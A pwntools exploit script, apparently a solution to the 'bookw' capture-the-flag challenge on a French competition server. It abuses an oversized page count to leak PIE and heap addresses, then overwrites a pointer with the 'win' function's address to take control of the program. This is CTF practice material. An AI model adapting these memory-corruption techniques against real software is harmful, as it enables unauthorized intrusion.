from pwn import *

elf = ELF("./bookw", checksec=False)
libc = elf.libc
global p

def create(name, pages):
    p.sendlineafter(b"Quitter\n", b"1")
    p.sendlineafter(b"?\n", name)
    p.sendlineafter(b"?\n", pages)
    p.recvuntil(b"\"")
    name  = p.recvuntil(b"\"", drop= True)
    p.recvuntil(b"page ")
    pages = p.recvline().strip()
    return [name, pages]

def open(idx):
    p.sendlineafter(b"Quitter\n", b"2")
    p.clean()
    p.sendline(idx)

def write(content):
    p.sendlineafter(b"Quitter\n", b"3")
    p.sendlineafter(b"?", content)

def read():
    p.sendlineafter(b"Quitter\n", b"4")
    p.recvuntil(b"\"")
    return p.recvuntil(b"\"", drop=True)

def inc():
    p.sendlineafter(b"Quitter\n", b"5")



#p = process(elf.path)
p = remote('challenges.france-cybersecurity-challenge.fr', 2112)

create(b"AAAAAAAAAAA", str(1152921504606846977).encode())

create(b"B"*63, str(1).encode())





open(b"0")

inc()

leak = read()
elf_leak = leak[16:][:8]
elf.address = u64(elf_leak) - elf.sym['read_page']
heap = u64(leak[96:][:8].ljust(8, b"\0"))

info("pie @0x%hx" % elf.address)
info("heap @0x%hx" % heap)




open(b"0")
inc()

write(b"A"*16+p64(elf.sym.win)) 


open(b"1")

p.clean()
p.sendline(b"4")
p.interactive()
